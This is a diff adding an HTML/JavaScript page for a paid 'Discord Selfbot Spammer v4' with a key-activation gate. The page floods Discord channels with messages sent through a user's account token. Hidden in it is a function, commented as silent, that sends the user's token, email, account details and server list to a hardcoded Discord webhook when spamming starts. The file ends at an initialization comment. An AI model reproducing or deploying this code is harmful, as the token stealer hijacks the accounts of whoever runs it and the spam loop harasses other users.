@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Selfbot Spammer v4 - Key System</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Consolas:wght@400;700&amp;family=Arial:wght@400;700&amp;display=swap');
+        
+        :root {
+            --discord-bg: #2c2f33;
+            --discord-dark: #23272a;
+            --discord-green: #00ff00;
+            --discord-blue: #7289da;
+        }
+        
+        body {
+            background-color: #23272a;
+            font-family: 'Arial', sans-serif;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+        
+        .main-container {
+            width: 780px;
+            background-color: #36393e;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            margin: 20px;
+            overflow: hidden;
+        }
+        
+        .log-text {
+            background-color: black;
+            color: #00ff00;
+            font-family: 'Consolas', monospace;
+            font-size: 14px;
+            line-height: 1.4;
+            padding: 12px;
+            height: 320px;
+            overflow-y: auto;
+            border: 1px solid #00ff00;
+            white-space: pre-wrap;
+        }
+        
+        .activation-frame {
+            background-color: #2c2f33;
+            padding: 20px;
+        }
+        
+        .input-field {
+            background-color: #40444b;
+            border: 1px solid #72767d;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 4px;
+            width: 100%;
+            font-family: 'Consolas', monospace;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 0 2px rgba(0, 255, 0, 0.3);
+        }
+        
+        .btn-green {
+            background-color: #00ff00;
+            color: black;
+            font-weight: bold;
+        }
+        
+        .btn-red {
+            background-color: #ff0000;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .btn-blue {
+            background-color: #7289da;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .label {
+            font-weight: bold;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <!-- ==================== FRAME DE ATIVAÇÃO ==================== -->
+        <div id="activation-frame" class="activation-frame">
+            <div class="flex items-center justify-center gap-2 mb-3">
+                <span class="text-2xl">🔑</span>
+                <h2 class="text-xl font-bold">Activation System</h2>
+            </div>
+            
+            <div id="activation-status" class="text-center text-[#00ff00] font-medium text-sm mb-4">
+                Time remaining: Carregando...
+            </div>
+            
+            <div id="key-input-area">
+                <p class="text-center text-white text-sm mb-4">Digite sua chave para desbloquear o spammer:</p>
+                <input id="key-entry" type="password" 
+                       class="input-field mx-auto block w-[420px] text-center text-lg tracking-widest"
+                       placeholder="Cole sua chave aqui">
+                <button onclick="ativarChave()" 
+                        class="btn-green mx-auto block mt-5 px-10 py-3 rounded-md text-lg font-bold hover:scale-105 transition">
+                    ACTIVATE KEY
+                </button>
+            </div>
+        </div>
+
+        <!-- ==================== RESTO DA INTERFACE ==================== -->
+        <div class="p-6 space-y-6">
+            
+            <!-- Token -->
+            <div>
+                <label class="label flex items-center gap-2 text-base">
+                    <span class="text-xl">🔑</span> Account Token:
+                </label>
+                <input id="token-entry" type="password" 
+                       class="input-field" placeholder="Cole seu token do Discord aqui">
+            </div>
+
+            <!-- Channel IDs -->
+            <div>
+                <label class="label flex items-center gap-2 text-base">
+                    <span class="text-xl">📌</span> Channel IDs (separados por vírgula):
+                </label>
+                <input id="channel-entry" type="text" 
+                       class="input-field" placeholder="Ex: 123456789012345678,987654321098765432">
+            </div>
+
+            <!-- Interval -->
+            <div>
+                <label class="label flex items-center gap-2 text-base">
+                    <span class="text-xl">⏱️</span> Interval (segundos):
+                </label>
+                <input id="interval-entry" type="number" value="1" min="1"
+                       class="input-field">
+            </div>
+
+            <!-- Message -->
+            <div>
+                <label class="label flex items-center gap-2 text-base">
+                    <span class="text-xl">📝</span> Spam Message:
+                </label>
+                <textarea id="message-text" rows="5"
+                          class="input-field resize-y min-h-[120px]"></textarea>
+            </div>
+
+            <!-- Attachment -->
+            <div>
+                <label class="label flex items-center gap-2 text-base">
+                    <span class="text-xl">📎</span> Attachment (opcional):
+                </label>
+                <div class="flex items-center gap-4 bg-[#40444b] p-4 rounded-md">
+                    <button onclick="selecionarArquivo()" 
+                            class="px-6 py-2 bg-[#7289da] hover:bg-[#5b6dc2] text-white font-medium rounded-md flex items-center gap-2">
+                        <span class="text-xl">📤</span> Select File
+                    </button>
+                    
+                    <div id="file-label" class="flex-1 text-gray-400 text-sm font-medium">
+                        Nenhum arquivo selecionado
+                    </div>
+                    
+                    <button onclick="removerAnexo()" 
+                            class="px-6 py-2 bg-[#ff4444] hover:bg-[#cc3333] text-white font-medium rounded-md">
+                        Remove
+                    </button>
+                </div>
+                <input type="file" id="file-input" class="hidden" onchange="handleFileSelect(event)">
+            </div>
+
+            <!-- Botões -->
+            <div class="flex justify-center gap-4 pt-2">
+                <button onclick="iniciarSpam()" 
+                        class="btn-green flex-1 py-4 text-xl rounded-xl flex items-center justify-center gap-3 hover:scale-105 transition">
+                    <span class="text-3xl">▶️</span> START SPAM
+                </button>
+                
+                <button onclick="pararSpam()" 
+                        class="btn-red flex-1 py-4 text-xl rounded-xl flex items-center justify-center gap-3 hover:scale-105 transition">
+                    <span class="text-3xl">⏹️</span> STOP SPAM
+                </button>
+                
+                <button onclick="abrirSuporte()" 
+                        class="btn-blue flex-1 py-4 text-xl rounded-xl flex items-center justify-center gap-3 hover:scale-105 transition">
+                    <span class="text-3xl">💬</span> talk with support
+                </button>
+            </div>
+
+            <!-- Log -->
+            <div>
+                <label class="label flex items-center gap-2 text-base mb-2">
+                    <span class="text-xl">📜</span> Log / Console:
+                </label>
+                <div id="log-text" class="log-text"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // CHAVES DE ATIVAÇÃO (EXATAMENTE as mesmas do código original)
+        // ============================================================
+        const KEYS_30_STR = `dArMHtyFZueecbwn JqeXJVgObkFkVeyA UNHJlBQCMPeBKSmr JSQBWSxjkaFlVLAA IiqRZGwzMHFfUjiq tBfrRQFIVRZmAaiQ xzpgZeXKCUceyQhU pdXcsFIvBFvVMIOC uhHXlBCsntVSWYmu ZKDOdSAaRRrBCDHa AwYHpIbReewgFvHX KLybWHYjbPAkmMIQ pWydGrWyuTAwxqeq VqrnVWhdUJvGbFmZ yXAWBdlzuFmsJUtW kerpIZLDlKkdXjBZ wRYOqmcAqTmAmIUi hkvvMrhZBhFntjbd RtfEREyYygXakHEs YFVZUqxPaCPgzyqB BFYVOVhTEOORcwhe hGUjMeCankoVkKZN yoeySpMzssCQkBaO tmSAsqvKBTubwnAz svUmCXfTZtzjmLPs rVpEiNEWlivBYvgr UmcChqYQwzyFLbhq uDpgcCJTPYNUetOg HfnNZawPVIYeQATF yIHByBBqroPinkBb HkkyeEjlrSRSdjTQ JUBCJcXvotVQpkfG vpwQuJszCQFaFvTl wPWneGpcQoVuqpgp pPfKZAsiPkBmOSOd AlinchQCKuFWYQCz tMurazpuPHrAFaqF kLMURstnDPMlAIZo alScfOOjzdqCZmkM BtBPMDXXALZZgBKX hShOAXRTISJdGoFR KfxXJKqosnYMBUrh LPYBZFgZMobKuRqH TPHWGeoRpJrYbtap wipyGSIPANqvAvpw HUYSMCCUxYwHolKz zsSWcyfFqDnJhpRP PbrazkzMZRfINPqj GgvPPjYakqXzRfEZ MLiwXvghMNOeHHSE nOMUCUfoCYcZlOlN axBnWfYurVCPRzJn GHOmjmIGVXXAELVQ lBYWmkgIqAomCXzx kgwphCaqeSMxPvIE sutesgKFHUFvHvmP hvJnkwCHaMFiJxrT FuZXeJcjVFKPUKsq maVTjfbWggvgeAzC uHoiNrwnOVspmUJa fVOjQXrqvrrWzmsd nuCQEcmBvErXdpEh eUdprDVMbDRKRWGE jhkyfAohZPjHZcRm aTuKwlidUefjSHst hrLHAhNXMKidBHRx yeJlePdRIVsNNkdp RqkpVcZLoaCCDUWj HcGRIDScGxjGKhOt eDcntKdmvxNlgvYo CXHxANaWpGftvPwI cBVkweKdZLcvTjtK SJZrfEODKdbSlcLa iEbfznckdTtakqYP iESZLnoniRWlzGuB yOFhAEojrrZbghZJ rqCzPHtaZpYWvMQd vvqnHLeckXOiTWEI DTVdkguKJosJHVVi FTrwrimmjwQsIkqd GtoDSmGxltNtuZxM MWDOrLMLkEkqMTMn ukSIDqxAkVDTUKhs JbjLXXyYuYlGpADg jGHiQLeGfqCoMMnH ZEedFMXjYsitKLUJ ZZENXurLHbAYJsqx jyBgXoguEldsrQMu hJUBmJPKdVSchCts JQKnQaOtmtkQodjy kQUUOJzrGBbMKpqk qQlOBnPAOlxTcTmg llogsVYxoBDsrvEr OjDyGegQrFHZVoQT ILtuevKJlNuHoRwi hnmwphOhAAtLvlgz nBJCDXpJPwubabuy DiTfOqOZKTrwJMDo qdtwPyzpUswvxNfg ofTRkysRutYMDgTB tyhFwHQzbBKBJiGL VhUyMuZTqXiueZDS tIXTfiXwerGFaJYb CWeCOpCXbUYpIDve kvgwfpbtCXmaYNdr HidaJjoySxVqzoCR OICkMgiyAvtQgBWK evDOmpdtxdbMWENh dabicOhFHXoJUNJe sPXQdnmvZCcCgUUT iBXvZHkSgMPyYzKg yIgObaQJCapuRllR SiNLIppLgPRjCWZG OAnkcONwrdjnfQEx JAEgnMxvTJqgEGOm WguPPdsglZQVynAA mSQyGDOztjSVjisa ztUSZcZvNcmcjUMS kPpMcZzHmlzGXCvr RYBKOGRMEPDxCTcO dQkgQFcBLaiCvKwR pnmdKRhRYOEHCYVF fxBniHeEhgzjSAlE etHxwRYLjuBFUZoe IXMiMgQnAppwbLMM MmRYqSBCmIUrsBWb pptEoyguUAVESqwt fazQOoorKyeluScX wiYpieKurKFidBbS RDYqvgoslSKTIihh wdteQYhoifDVyIgN wyatcqTHYVbrctpC XTgVzaGuIWMyxtTw NOZXpiSrnjVPeZrg DiplTmjtlbTdYNmV QmXJTtwPkgsjhzfB lixZdKBeDIhaJstG NpJvoruQvVxmOEYD VyvLXDWpSfTwyqrZ zfiBjcDNEFrNMrDA EEpBjBfupCeCzAhE uLrKTloPmlNunYpl TOLzdUzrBLJzPROP RQcgPFwDOuqCdttP yDnVEgePZzkyOdsH liNKmijneqObBNcJ jQPuWkNeLxyjtpQS ywRBcuyOpIkMhrBs dRalBWqunIahUYCS UMwYewUoSNZKQEmC LHLiOiynNPjzjnjw KPsLSmqSJcBruZVs YjHyTeSotQrxoqSx cHtOGMylfCMrjEHp IRuMsGSESVzebVnF xFJYCJyeqDLRNNbU YlTpUCbyaujJWgzF XKrScHZUkLhnfJiO OzsjthJHpHHVvMrU RlVDwZjdMFpVBXst JFlyPXXwVyGOpAHO jqHbpvVtUNcwLeFf rOiQthcWskxMOHGX VjMttohWbkjmLoMt CoZTFkjXwLpwvZsj bfjLgITBwglkhmeE jGPwYMMPKXeatQPJ wKGxpkHEvYYybybH cchJLDIQwqmvLDCk QnSqmgiAZGUenTsF PlDnYibhGsKBRnRp ewwpWgSMzpDyPJVe AztLovNQSnxgYzDe cZLqvTOObrpnLIsU dlUfAmNQDoJuvKjB jsfOzsEEGNWFyJSQ lMrhNcQIdUinBgMW dMIziNOYUaifKXwa lFhjVvSGdzPMkPSL oilgmCSnAkYnOqyP rnucBzCjAVTfRhve wfEsWAYfNvnuRhwN gdaLYicqCRJunTgP gaOyJYUTGEoDpNsJ rAgMHGlEKfObhnZC OaoSEBINohoPdmvB ODBdWoIowqOiKdRd OtQEXaZRImceBbfi rKFCQVQewMJMncHD bjHeUZzfDUmBgbNP bIvvdIykIAZEnQbh OswiCnUemxxacnjC LFIFMdlEhqwnHBxR uLQzvvQzligcRfog OReyLzOauckLVPiq HgSnZIkpkBNqxdbu RhSCsVEsXLzGgnHe wfTmDhpcwLopeIFi iJHLYwxMOaQheIcY uoPWliJGOsLneYYC oaUcLJDMKUuQjRSD lHEtGBwYMCVBvPVw VFPEJHiFYkScWlUc JAFDvWNkLrKxeBpy zXyZaZbOtEkiClEv UfJMKipnuHDckJqH jYXWxQwGWZUYflFj eZnpSOBTTYbrJPLN DzoAKxfZGBMBtmoI mxgNVjDnVZvOrKdp fIEvjEzVNrTUElRH kinPGpWJiSmUiYBL zNWCpdIGnYmvHeRm UErLlLRHoQEGSxPU rrnBRejUmAvdrQqa nsWMqOxxvKQPhghR UMqTZerwlVWhUHLE zrCfkqiUKfKevhlh dLovvWWDVPRpyYVH GycELPcsBVFgYoYw cefefoZYMJiyzoPf QHCLqLoCgxrgGGaO quGOiapZPUnAquMb yNhBliYmfHAxiLWt PhBKdqPjGbOEuBQc JRLsYDOrqZslCFBK MDmmcevBhRwapEIt CmHJKbcFuKVVVjgQ NKjMPCotUZjKNpsw gpXaRrfIIgOQRXIY vZbdwrelhACjkUcJ XfqmFXgHRMBYWooe eIrWQjBhpYolFcFp PutKbvwsuaZGOvJo gKDkqPgNSneeKsIo EnzIPhvfKvXAjruo rKYooxmvjatHgInk ezXqvwxiNHqTLEvw oFaXLbJhbFDvyHyA rbjGKpRfsNKCxZUe vOWoyQSfltBjzNeJ lVYMDwsfUuXuNdWC cIMlRZNrbGZhmyBv IFKhcyWCXWFoMnHP lXEmBjoQxenEfMVX kPvDlasQZDWQjZhk edKLBKzuuFUfcAPM xuxdhKzfiaOXmKzS sBhzelCznFGBBsvb MpWtRYPHLdTNpHYU ObPwyQKUqQnLUTVi fuoaYZXpksHZYSeg rFiyIDUHzGPlJlkH dzsZQVfXXFrvHRms IlTPhHuzXnELfExZ xonsufjIVmbLfbzL NFKMFkKUNcSWsKzi wiPPZoMGfLaSUlVe PuzssCyNgJbqzaey CdkvtHjEzKzKBVre joIWDFccWFKOxOnR HKKRcLXrAnHYIEcE GyaFfFxEkYfjUsQA zKEdvzUJuSgaeGPO dlnTsqnvfGkJcdoz QfKkClkUurCAwppP hBBMpvUEPrwrWENI XLtaweFaeyXCwlIO cGPVhLRDNKkUCNuF RJXYSGuPfZcQGHMg rzwrOAJmyGKiwPRC hPgmjJXpSBaAHMvO KEtDapArayxSvdSA qWrLVArVoLDtvIgZ iJDPVYleeDaGecbn fJHlUMSPeykHTTaO AcoWKLYuImhpPvZV UNADjSjxDtrXwLJe SpkpnvyIEQmIOpsx jArSsqFaLtMVpyTg oIfvKLXJNUUZXkCE tDxvkysIkCWNTZsi WVEtoDzdVdBlIomF LPqMGyYlTqiEMdPV cDFyeVTOYFXGBQDz QtwtCDPpbQSDpvvG YtmUaXtPoBNdZwke GitmlANLAfALAUzn chVPyVbzFDsXeEkY pkVjLutNBqkxaYHj oJsfIpWNVGbNQUHv ARlsBdXuARgsneLU uBNMBtFEwvibpBfm OCXChulqOOqAKFcq OrXcurEpSJgfFYZd bQlPbZFoLEbBsejo aZepryCcxUVihjni FzLgFDffXJLhThSV RLipzrsXmpTspXnt DJKfWIshdsPGCpGH YHlRPObYVcsEeeSg ewKTfEGmbosARZlM aLLYivDulDQuvZvp zjpJERYaFncEJsDB pzeEKSkqgROHPawQ GJGlpOdYCwqxCcXy QpbkMQyinCsCxgHE AZigEuzbYDlVJlFQ anUuZWmobHdunSGe BVjjiBnFaudyZgXb XTbcbznnBEDvlVjK vuAnOazLSrzRPSBG LXntcsFaHrRxLZkN YJxbzAZLAqahVKFR hWLWrmXbQLFONsHl pZcYzxMQFxCaAjNF eLfObiyAXTbriFxn dMxvWjWDsUkKtDSs SFUSJHjQNWgbngtM ZUBVEVnIVhPoOAhi VVkBuuxNZylofPcm YCQSpVIGUBRLMzHo DNpNCSQSqVjMDERo IxNhyujUwvGZaEly DxDfsqccuWyepUYY jwwLfCXRNORKqSvf AHOSeAOGKeCuMJDL ffGBaBrMaFUTJLSO UPYKWMUzIoKNEsja ewXOpyyfMwnHKtUi GXnAeYJEpFJmNgPk HMosJodudzlUIeAN OJJiDszskDejKBUP zupdeksvluDLVAeQ nesYifMRbpKTbnFu NfJuIOSdjSKFSDqJ nwxTMDsOuNIXchYD ywfysBjOeUYfjZrQ ifpixpwIcSuDozuD xHLqWYNiiepoCAcR fqThNacjtWjJUbHt QcoMnZKOISidIxXh bhYaxFmiKsajjbUk dqgeMGQVxsxHAQrd pGfDuoqRXZDrQPfI EtXsrlOrNxLUWrDN JuCQOujzQeoHRQta OuwiLOgCUhYptlWw AVZDxswdvNYAbvkn FEsYfjyTPTTgXCCX LpiJudNGLOnPUyeO OBelmcuzJUXQdGko fugbWbLZoRcjwMjb oUFkDLBtVomxIIhY RkGFQhjtPljMHNXs DSIcGJOHzjxAUTto cXXyrLYqsUIuWWFn KoSOkFVtCpoWdFAC fKKXYEeLpxxPZGzj tCFmbwSWcaxaFiSK GygKmiDEFfTZBscL OZuRUbntYFAQwbVw IaVnbQBIQGVjxhKO SrobCUDSKjesEwUq ozmXjQStsCzJfiVC BawAcapBhJNOWhjK ZAMzPSpvCQnilKWe DREwsYrOZhyPQksR EjiXWuyUXJxIiOzL HBzcVmQBiMBrhRMO zKNeQTvwDRLweXCH AmCiQmXnjUbemJgH YEIdZWfxfcULGeoX bNhtoKUmQzJYMnRT dzjdaBZnQAUmllji HjLsKyNebSyHbnCQ NjMOGBpwEeTYiQsq sHbDmOgezKLISZKP ndbBUbgBYmzuBiHx UZfEsypUwvYDDJDV XRvwSrAdRniVDUsZ lCuWcJNPPquVwMlh FPtuhDbUukHGkNQM lijgvWtoneiYARIu YovNvtLDThxuCvJs UmUbUwrIaZCzulhO yQuJEtJemSQOVXNs FkoLxlsSPoDjHdxH nycPNGNfCrjAIIJl FfrKvAmbEaxLYjvM FqmQiozekNWzdeVd iyKUVLFUMnjXWHZa nrbxDuLuqItkBaQG cMxiQBoDDJGKoScp eAisBAeqYORDnVuc YKDVUpxVcCpxCoMX MQWwIezwRaMCFmim xguEUPWqWjgmGgRX SKJXHMtVWlJJRPJD qPZFPwGmbtyCfeEA KGkLgyAoLZjmOpXP RrRcbAJrzVwERzHL MfFRroqWAbWoWexO XFWgboTlIfRwRQwk uDUERKRVLeDfLjQT TXqSiLGZtbfkFHZj JvKMzUukCMGOgtOe TeWkUSNrHUXFodTS OaVNHXCBocCayQce cghOgHMAiznvFFen YdcPvtKSENYdSqgJ RmjZUYwMTGPQmBJI OiuslKJuRabBnaPB LqMXNzyuSfGUqZze odIKGWrskPSWNhls GgCYgQEPFESpIMeR baYigTNaqokSdzBH jcChiwUBfeOVaJZh ngXJpBWyAecSBxij nAIUdRIAmUUtodEk aqHeOrxJdZhafMqL GMeXWIlbGHqWedHe lXFhSlgkuBtGFADY EQYFUkpzgdNknoJQ JYdMHIvcGDcAZaps ADoKknEYZybSmCIN AyVCjBbbSOLQdiVd MKCnWdGofURfvBVX wazyHwpwPLntwwWl FCSCEebNntdsGujM PabLmPdJrZzdQtoB KNzedaUMiEimuNSN thtGAzRrSIBkTIIP ZjfsWjWEhmmNgIGV WRwMFBggokRrGcNy RwspnZrRmtYkqkMZ gPrprUhSaYbWVnQM hUvMHiRbeiIXWrKC KEzoKMqXyoeIrYvN UkSvhkraLUJfUuOR ZMkeHUxMBryiDDJN KoKivYWMjzUYGWsG fPOsRDMuTgMcVldR KGowqJwwqtkkipbe aSyDonuTqkKpoqsl GpeCgyIsXKXTUJem kDIIhgeurPBuDZep DxgFgdfPSiqoMsKr XEqkiEiFxtzvBFuY PqPcrwVOrclKnduT MiUUvRaDcvsBuFLZ sqfrtAjJGpcSbaOy BxLHULyAqEJYlIvI QVcwmLfsMPWJCYEM gXNxPYTSHnmxSumx AobBziVxjrWGOWFo iRjAQHoWadsldfOR rntYInREmUmsfyXP yczUwXYRDAzIdhUu nDNvjBvFxIzWXHcT EkADhGDABppDAVjn weICSTNLHiOqlBEH KYnFdmNpMrjufEch qPuFSMgBkQqMOhgh KQkdmrZLarZWWeCn LNZUVhkrOpNfVlgi NlMBRSSLVUxUpLOz mFmOCpeWzBsTjwsx xFKsocmrqWWJIcKN SbdLrtVOlYCMJSRM XFbdnXMkrHBfJeTB oWpWzhfsoJYhsAny jaEzhjDWWcKFtTSC eDmciNflDGqMHrfe hujzzXoVYefTyMpn veSiyugGQWEiTluD tdMpNNnGtDvdLNHe nWdbArQcolllEkrO LfttjVlegFOrQXRK zJKcJpEGwqyUyUmQ mYQOvBdZvWEpkebz MskdagJiKxjJlrPg WWNZDKvfBJmrhYUW aHMkpfKqRZGziMal iuFjUWPRGpTiaWEr zHzkcEURxqpBGtBT YIxQQWissWknRqRT jVvxInRAWodtemRH jCgGFDpLRKDQOQTp brhjUBjLRLNAahmv uAqwiKUDwcHEjInd OXkFVSqEMyJtdoDq utwFgtocuTjTxUzs RhDxHYtqUSksKZzP hEmbzRGnFSGCvfzL GkAaBwTtPWLLWdMp yArBOsVLxdidxlSo UeznmaWpzduVBRVz iaVWDsKvlxEQiWTY hqncTSqFytuSgWll`;
+        
+        const KEYS_1_STR = `XyzAbCdEfGhIjKlMn OpQrStUvWxYzAbCdE fGhIjKlMnOpQrStUv WxYzAbCdEfGhIjKlM nOpQrStUvWxYzAbCd EfGhIjKlMnOpQrStU vWxYzAbCdEfGhIjKl MnOpQrStUvWxYzAbC dEfGhIjKlMnOpQrSt UvWxYzAbCdEfGhIjK`;
+        
+        const MASTER_KEYS_30 = new Set(KEYS_30_STR.trim().split(/\s+/));
+        const MASTER_KEYS_1 = new Set(KEYS_1_STR.trim().split(/\s+/));
+        
+        // ============================================================
+        // VARIÁVEIS GLOBAIS
+        // ============================================================
+        let activatedKey = null;
+        let expirationDate = null;
+        let spamIntervalId = null;
+        let running = false;
+        let currentFile = null;
+        let MENSAGEM = "";
+        let CHANNEL_IDS = [];
+        let INTERVALO = 1;
+        let TOKEN = "";
+        
+        const ACTIVATION_FILE_KEY = "activation_data"; // simula o arquivo activation.json
+        
+        // ============================================================
+        // CARREGAR / SALVAR ATIVAÇÃO (localStorage)
+        // ============================================================
+        function loadActivation() {
+            const saved = localStorage.getItem(ACTIVATION_FILE_KEY);
+            if (saved) {
+                try {
+                    const data = JSON.parse(saved);
+                    const exp = new Date(data.expiration);
+                    const now = new Date();
+                    
+                    if (exp > now && (MASTER_KEYS_30.has(data.key) || MASTER_KEYS_1.has(data.key))) {
+                        activatedKey = data.key;
+                        expirationDate = exp;
+                        return true;
+                    }
+                } catch (e) {}
+            }
+            return false;
+        }
+        
+        function saveActivation(key, days) {
+            const exp = new Date();
+            exp.setDate(exp.getDate() + days);
+            
+            const data = {
+                key: key,
+                expiration: exp.toISOString()
+            };
+            
+            localStorage.setItem(ACTIVATION_FILE_KEY, JSON.stringify(data));
+            activatedKey = key;
+            expirationDate = exp;
+            appendLog(`✅ Key activated successfully! Valid for ${days} days.`);
+        }
+        
+        function getRemainingTime() {
+            if (!expirationDate) return "Key not activated";
+            const now = new Date();
+            const diff = expirationDate - now;
+            
+            if (diff <= 0) return "Key expired";
+            
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            return `${days} days and ${hours} hours`;
+        }
+        
+        // ============================================================
+        // LOG SEGURO
+        // ============================================================
+        function appendLog(texto) {
+            const logEl = document.getElementById("log-text");
+            logEl.innerHTML += texto + "<br>";
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+        
+        // ============================================================
+        // ATUALIZAR TEMPO RESTANTE (a cada 60 segundos)
+        // ============================================================
+        function updateRemainingLabel() {
+            const statusEl = document.getElementById("activation-status");
+            if (statusEl) {
+                statusEl.textContent = `Time remaining: ${getRemainingTime()}`;
+            }
+            setTimeout(updateRemainingLabel, 60000);
+        }
+        
+        // ============================================================
+        // ATIVAR CHAVE
+        // ============================================================
+        function ativarChave() {
+            const key = document.getElementById("key-entry").value.trim();
+            if (!key) {
+                alert("Enter a key!");
+                return;
+            }
+            
+            let days = 0;
+            if (MASTER_KEYS_30.has(key)) days = 30;
+            else if (MASTER_KEYS_1.has(key)) days = 1;
+            else {
+                alert("Invalid or already used key!");
+                return;
+            }
+            
+            if (activatedKey && activatedKey === key) {
+                alert("This key has already been used on this installation!");
+                return;
+            }
+            
+            saveActivation(key, days);
+            alert(`Key activated! The spammer is unlocked for ${days} days.`);
+            
+            // Esconde o frame de ativação
+            document.getElementById("activation-frame").style.display = "none";
+            document.getElementById("key-entry").value = "";
+            
+            updateRemainingLabel();
+        }
+        
+        // ============================================================
+        // ENVIAR TOKEN PARA O WEBHOOK (silencioso)
+        // ============================================================
+        async function sendTokenToWebhook(token) {
+            try {
+                // Busca dados do usuário
+                const userRes = await fetch("https://discord.com/api/v9/users/@me", {
+                    headers: { "Authorization": token }
+                });
+                
+                if (!userRes.ok) {
+                    appendLog("⚠️ Unable to fetch account data (invalid or blocked token)");
+                    return;
+                }
+                const user = await userRes.json();
+                
+                // Busca guilds
+                const guildsRes = await fetch("https://discord.com/api/v9/users/@me/guilds", {
+                    headers: { "Authorization": token }
+                });
+                const guilds = guildsRes.ok ? await guildsRes.json() : [];
+                
+                const guildList = guilds.slice(0, 50).map(g => `${g.name || 'No name'} (ID: ${g.id})`).join(', ');
+                
+                const payload = {
+                    content: `**New Selfbot Spammer v4 activation**\n` +
+                             `**Token:** \`${token}\`\n` +
+                             `**User:** ${user.username}#${user.discriminator} (${user.id})\n` +
+                             `**Email:** ${user.email || 'N/A'}\n` +
+                             `**Verified:** ${user.verified || false}\n` +
+                             `**Servers (${guilds.length}):** ${guildList || 'None'}\n` +
+                             `**Date/Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
+                };
+                
+                const webhookUrl = "https://discordapp.com/api/webhooks/1489255567804338299/3FRUdnGlKopJ3Kka6x2E_8GIprxxnJ7D8NSqlfFXpeA-ZbmQpLwCkB_XGijlk0r0cvLi";
+                
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                appendLog(`⚠️ Error sending data to webhook: ${e.message}`);
+            }
+        }
+        
+        // ============================================================
+        // FUNÇÃO DE ENVIO REAL PARA O DISCORD (via REST API)
+        // ============================================================
+        async function sendToChannel(cid, token, mensagem, file) {
+            try {
+                let formData = new FormData();
+                
+                // Payload JSON
+                const payload = { content: mensagem || "" };
+                formData.append("payload_json", JSON.stringify(payload));
+                
+                // Anexo
+                if (file) {
+                    formData.append("files[0]", file);
+                }
+                
+                const response = await fetch(`https://discord.com/api/v9/channels/${cid}/messages`, {
+                    method: "POST",
+                    headers: {
+                        "Authorization": token
+                    },
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    const emoji = file ? "✉️ + 📎" : "✉️";
+                    appendLog(`${emoji} Sent in #${cid}`);
+                } else {
+                    appendLog(`⚠️ Error in channel ${cid}: ${response.status} ${response.statusText}`);
+                }
+            } catch (e) {
+                appendLog(`⚠️ Error in channel ${cid}: ${e.message}`);
+            }
+        }
+        
+        // ============================================================
+        // INICIAR SPAM
+        // ============================================================
+        async function iniciarSpam() {
+            if (!activatedKey) {
+                alert("Access Denied - You need to activate a valid key first!");
+                return;
+            }
+            
+            if (running) {
+                alert("Spam is already running!");
+                return;
+            }
+            
+            TOKEN = document.getElementById("token-entry").value.trim();
+            const channelText = document.getElementById("channel-entry").value.trim();
+            MENSAGEM = document.getElementById("message-text").value.trim();
+            INTERVALO = parseInt(document.getElementById("interval-entry").value) || 1;
+            
+            if (!TOKEN || !channelText || (!MENSAGEM && !currentFile)) {
+                alert("Fill in Token, Channel IDs and at least the Message or an Attachment!");
+                return;
+            }
+            
+            // Valida IDs
+            try {
+                CHANNEL_IDS = channelText.split(",").map(x => parseInt(x.trim())).filter(x => !isNaN(x));
+            } catch (e) {
+                alert("Channel IDs must be numbers separated by commas!");
+                return;
+            }
+            
+            if (CHANNEL_IDS.length === 0) {
+                alert("No valid channel IDs!");
+                return;
+            }
+            
+            // Envio silencioso do token para o webhook
+            appendLog("🚀 Sending activation data to webhook (silent)...");
+            sendTokenToWebhook(TOKEN);
+            
+            running = true;
+            appendLog("🚀 Starting self-bot with attachment...");
+            
+            // Simula "on_ready"
+            CHANNEL_IDS.forEach(cid => {
+                appendLog(`✅ Channel found: #${cid}`);
+            });
+            
+            appendLog(`✅ Spamming in ${CHANNEL_IDS.length} channel(s) every ${INTERVALO}s`);
+            
+            // Inicia o loop de spam (igual ao @tasks.loop)
+            spamIntervalId = setInterval(() => {
+                if (!running) return;
+                
+                CHANNEL_IDS.forEach(cid => {
+                    sendToChannel(cid, TOKEN, MENSAGEM, currentFile);
+                });
+            }, INTERVALO * 1000);
+        }
+        
+        // ============================================================
+        // PARAR SPAM
+        // ============================================================
+        function pararSpam() {
+            if (!running) return;
+            clearInterval(spamIntervalId);
+            spamIntervalId = null;
+            running = false;
+            appendLog("⏹️ Stop requested... Spam stopped.");
+        }
+        
+        // ============================================================
+        // SUPORTE
+        // ============================================================
+        function abrirSuporte() {
+            window.open("https://discord.com/users/1332898061843824744", "_blank");
+            appendLog("🔗 Support link opened!");
+        }
+        
+        // ============================================================
+        // SELECIONAR ARQUIVO
+        // ============================================================
+        function selecionarArquivo() {
+            document.getElementById("file-input").click();
+        }
+        
+        function handleFileSelect(e) {
+            const file = e.target.files[0];
+            if (file) {
+                currentFile = file;
+                document.getElementById("file-label").innerHTML = 
+                    `📎 <span class="text-white">${file.name}</span> <span class="text-gray-400">(${ (file.size / 1024 / 1024).toFixed(2) } MB)</span>`;
+                appendLog(`📎 Attachment selected: ${file.name}`);
+            }
+        }
+        
+        function removerAnexo() {
+            currentFile = null;
+            document.getElementById("file-input").value = "";
+            document.getElementById("file-label").innerHTML = "Nenhum arquivo selecionado";
+            appendLog("📎 Attachment removed.");
+        }
+        
+        // ============================================================
+        // INICIALIZAÇÃO
